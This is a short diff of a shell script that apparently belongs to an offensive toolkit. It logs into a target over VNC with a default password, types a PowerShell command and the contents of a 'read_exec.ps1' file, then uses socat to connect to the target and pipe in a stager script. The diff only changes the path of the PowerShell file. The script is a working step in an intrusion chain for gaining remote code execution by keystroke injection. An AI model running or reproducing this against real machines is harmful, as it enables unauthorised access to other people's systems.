@@ -7,5 +7,5 @@ vncdo -s $1 -p password \
 	type "powershell" \
 	key enter \
 	pause 2 \
-	typefile win/USaBuse_PS/USaBuse_PS/read_exec.ps1 && \
+	typefile powershell/read_exec.ps1 && \
 	socat TCP:$1:23 EXEC:"./stage.sh $2"
